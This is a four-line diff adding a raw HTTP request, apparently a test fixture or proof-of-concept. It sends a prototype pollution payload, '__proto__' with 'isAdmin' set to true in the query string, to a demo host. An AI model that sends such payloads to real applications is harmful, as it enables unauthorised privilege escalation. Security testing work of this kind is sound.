@@ -1,0 +1,4 @@
+GET /a?q={"__proto__":{"isAdmin":true}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
